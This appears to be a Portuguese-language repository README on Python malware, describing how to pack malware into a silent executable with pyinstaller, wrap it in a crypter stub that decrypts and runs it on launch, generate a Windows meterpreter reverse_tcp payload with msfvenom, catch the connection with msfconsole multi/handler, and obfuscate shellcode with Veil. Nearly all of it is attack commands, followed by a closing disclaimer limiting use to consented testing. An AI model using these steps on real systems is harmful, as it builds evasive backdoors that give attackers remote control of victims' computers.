## Malware python 
Aqui você encontrará exemplos de código, scripts para ajudar na compreensão e pesquisa de malware

Empacotando malware em python para um executável. 

Instalando o pyinstaller 
```bash
  pip install pyinstaller  
```
    
Criando Executável 
```bash
  pyinstaller -F --clean -w <nome_programa> 
```

-F  criar um arquivo executável. 

--clean remove esses arquivos temporários e de cache, deixando apenas o executável final gerado.

-w é usado para criar um executável sem console, o programa é executado silenciosamente sem interação do usuário.

## Combinando o Crypter com payloads do msfvenom 

#### Funcionamento de um Crypter: 
Como estamos usando o python, o malware.exe será criptografado dentro de um arquivo chamado stub.py. O arquivo stub.py é transformado em um executável, agora quando executado, acontece a descriptografia e a execução do malware.exe.
```bash
  malware > crypt > stub > executa > decrypt > malware >  executa malware 
```

Criando um payload.exe 
```bash
  msfvenom -a x64 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=IP_local LPORT=443 -f exe -o payload.exe
```
Payload + crypter
```bash
  python cripto_stub.py caminho/do/arquivo.exe nome_stub.py
```
Escutando com o msfconsole

```
  msfconsole use multi/handler
  set payload windows/meterpreter/reverse_tcp
```
[Click aqui para ver meu artigo sobre Exploits e Metasploit](https://medium.com/@robertocoliver/exploits-e-metasploit-6b338db4266)

## Obfuscação de shellcode com Veil

git clone na ferramenta Veil e entrando no diretório 
```
 https://github.com/Veil-Framework/Veil
 cd Veil/config
```
Instalando dependências 
```
 ./setup.sh            
```



#### Aviso Legal
> Estes scripts destinam-se apenas a fins de teste e acadêmicos e só podem ser usados com o consentimento estrito das partes.
>  É responsabilidade do usuário final obedecer a todas as leis locais, estaduais e federais aplicáveis.
> Os desenvolvedores não assumem nenhuma responsabilidade e não são responsáveis por qualquer uso indevido ou danos causados por esta ferramenta e software em geral.
